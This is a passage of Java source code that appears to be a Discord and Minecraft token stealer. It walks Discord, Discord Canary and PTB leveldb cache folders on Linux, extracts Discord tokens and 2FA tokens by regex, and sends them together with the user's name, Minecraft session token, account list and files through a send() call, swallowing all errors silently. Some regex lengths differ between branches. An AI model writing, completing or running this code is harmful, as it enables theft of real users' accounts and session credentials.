
							Pattern p = Pattern.compile("[\\w]{64}\\.[\\w]{2}\\.[\\w]{27}"); //regex pattern
							Matcher m = p.matcher(strLine); //match the pattern to the contents of the file
							Pattern mfa = Pattern.compile("mfa\\.[\\w-]{14}"); //qq's 2fa token regex
							Matcher mfam = mfa.matcher(strLine); //swag regex matcher

							while (mfam.find()) { //everytime a token is found
								send(username + "  -  " + mfam.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
							} //it
							while (m.find()) { //everytime a token is found
								send(username + "  -  " + m.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
							}
						}
						fstream.close();
						in.close();

					} catch (Exception ignored) {

					}
				}
			}
			if (os.contains("linux")) {
				String path = System.getProperty("user.home") + "/.config/discord/Cache/Local Storage/leveldb/";
				String canaryPath = System.getProperty("user.home") + "/.config/discordcanary/Cache/Local Storage/leveldb/";
				String ptbPath = System.getProperty("user.home") + "/.config/discordptb/Cache/Local Storage/leveldb/";
				String username = System.getProperty("user.name");

				String[] pathnames;
				String[] canaryPathnames;
				String[] ptbPathnames;

				File file = new File(path);
				File canaryFile = new File(canaryPath);
				File ptbFile = new File(ptbPath);

				pathnames = file.list();
				canaryPathnames = canaryFile.list();
				ptbPathnames = ptbFile.list();
                /*fr.close();    //closes the stream and release the resources
                System.out.println("Contents of File: ");
                System.out.println(sb.toString());   //returns a string that textually represents the object*/

				for (String pathname : pathnames) {
					try {
						FileInputStream fstream = new FileInputStream(path + pathname);
						DataInputStream in = new DataInputStream(fstream);
						BufferedReader br = new BufferedReader(new InputStreamReader(in));
						String strLine;
						while ((strLine = br.readLine()) != null) {


							Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}"); //regex pattern
							Matcher m = p.matcher(strLine); //match the pattern to the contents of the file
							Pattern mfa = Pattern.compile("mfa\\.[\\w-]{84}"); //qq's 2fa token regex
							Matcher mfam = mfa.matcher(strLine); //swag regex matcher

							while (mfam.find()) { //everytime a token is found
								send(username + "  -  " + mfam.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
							} //it
							while (m.find()) { //everytime a token is found
								send(username + "  -  " + m.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
							}
						}
						in.close();
						fstream.close();
					} catch (Exception ignored) {

					}
				}
			}

		} catch (Exception ignored) {

		}
	}

	private static byte[] readByteArrayLWithLength(DataInputStream reader) throws IOException {
		int length = reader.readInt();
		if (length > 0) {
			byte[] bytes = new byte[length];
			reader.readFully(bytes, 0, bytes.length);
			return bytes;
		}
		return readByteArrayLWithLength(reader);
	}
}

